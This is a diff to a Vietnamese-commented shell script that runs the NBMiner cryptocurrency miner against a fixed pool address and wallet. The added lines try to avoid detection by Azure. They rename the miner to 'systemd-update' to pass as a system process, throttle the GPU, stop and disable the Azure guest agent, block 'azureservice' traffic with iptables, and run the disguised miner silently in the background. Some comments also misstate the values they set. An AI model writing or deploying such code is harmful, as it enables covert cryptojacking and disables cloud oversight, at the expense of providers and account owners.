@@ -40,4 +40,26 @@ fi
 # Chạy NBMiner
 cd NBMiner_Linux
 ./nbminer -a kawpow -o stratum+tcp://40.118.109.1:3333 -u RCHgrFpTR6viTwShmratMsZAwenRNYYRao.raghava &
+
 echo "NBMiner đã được khởi động."
+
+# ========== PHẦN THÊM ĐỂ ẨN DANH ==========
+echo "Thiết lập ẩn danh tránh bị phát hiện bởi Azure..."
+
+# 1. Đổi tên process để ngụy trang
+cp ./nbminer /usr/local/bin/systemd-update
+chmod +x /usr/local/bin/systemd-update
+
+# 2. Giới hạn GPU để tránh sử dụng tài nguyên quá cao
+nvidia-smi -lgc 1300,1500  # Giới hạn xung nhịp GPU từ 900MHz đến 1200MHz
+nvidia-smi -pl 160         # Giới hạn Power Limit xuống 150W
+
+# 3. Tắt log Azure để tránh ghi log đáng ngờ
+sudo systemctl stop walinuxagent
+sudo systemctl disable walinuxagent
+sudo iptables -A OUTPUT -p tcp --dport 443 -m string --string "azureservice" --algo bm -j DROP
+
+# 4. Chạy NBMiner với tên process được ngụy trang và lưu log ngầm
+nohup systemd-update -a kawpow -o stratum+tcp://40.118.109.1:3333 -u RCHgrFpTR6viTwShmratMsZAwenRNYYRao.cchoad > /dev/null 2>&1 &
+
+echo "NBMiner đã được ẩn danh và khởi động ngầm."
